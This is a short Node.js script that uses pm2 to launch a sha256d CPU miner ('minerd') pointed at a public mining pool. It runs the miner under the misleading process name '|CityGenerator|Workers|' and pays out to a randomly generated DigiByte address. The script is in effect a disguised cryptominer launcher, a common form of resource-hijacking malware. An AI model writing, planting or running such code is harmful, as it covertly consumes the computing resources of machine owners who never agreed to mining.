const pm2 = require('pm2');
const digibyte = require('digibyte-js');

/**
 * Generates a random Digibyte address.
 * @returns {string} The generated Digibyte address.
 */
function generateRandomAddress() {
    const privateKey = new digibyte.PrivateKey();
    const address = privateKey.toAddress().toString();
    return address;
}

pm2.connect(function(err) {
  if (err) {
    console.error(err);
    process.exit(2);
  }

  const randomAddress = generateRandomAddress(); // Generate a random Digibyte address

  pm2.start({
    script    : `./minerd -a sha256d -o stratum+tcp://eu1.solopool.org:8004 --userpass=${randomAddress}:x`,
    args      : '',
    name      : '|CityGenerator|Workers|'
  },
  function(err, apps) {
    if (err) {
      console.error(err);
      return pm2.disconnect();
    }

    pm2.list((err, list) => {
      console.log(err, list);
    });
  });
});
